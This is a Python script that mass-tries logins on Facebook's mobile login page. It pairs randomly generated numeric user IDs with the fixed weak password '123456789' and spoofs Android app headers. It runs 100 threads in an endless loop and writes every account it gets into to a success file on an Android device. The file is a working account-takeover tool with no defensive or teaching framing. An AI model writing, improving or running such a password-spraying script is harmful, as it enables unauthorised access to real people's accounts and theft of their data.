import random
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Thread-safe print and file write
print_lock = threading.Lock()
file_lock = threading.Lock()

def generate_15_digit_userid():
    rest = ''.join(random.choices('0123456789', k=11))
    return '1000' + rest

def attempt_login():
    try:
        username = generate_15_digit_userid()
        login_url = "https://m.facebook.com/login.php"
        session = requests.Session()
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Referer": "https://m.facebook.com/reg",
            "Connection": "keep-alive",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Net-HNI": "51502",
            "X-FB-SIM-HNI": "51502",
            "X-FB-HTTP-Engine": "Liger",
            'x-fb-connection-type': 'Unknown',
            'accept-encoding': 'gzip, deflate',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/444.0.0.0.110;]',
        }
        response = session.get(login_url, headers=headers)
        soup = BeautifulSoup(response.text, "html.parser")
        lsd = soup.find("input", {"name": "lsd"})["value"]
        jazoest = soup.find("input", {"name": "jazoest"})["value"]
        payload = {
            "lsd": lsd,
            "jazoest": jazoest,
            "email": username,
            "pass": "123456789",
            "login": "Log In",
        }
        login_response = session.post(login_url, headers=headers, data=payload)
        cookies = session.cookies.get_dict()
        if "c_user" in cookies:
            with print_lock:
                print(f"✅ Login successful! User ID: {cookies.get('c_user')} ({username})")
            with file_lock:
                with open("/storage/emulated/0/success.txt", "a") as file:
                    file.write(f"{cookies.get('c_user')}:{username}\n")
        else:
            with print_lock:
                print(f"❌ Login failed for {username}")
    except Exception as e:
        with print_lock:
            print(f"⚠️ Error for attempt: {e}")

if __name__ == "__main__":
    max_workers = 100  # Adjust as needed
    while True:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(attempt_login) for _ in range(max_workers)]
            for future in as_completed(futures):
                future.result()
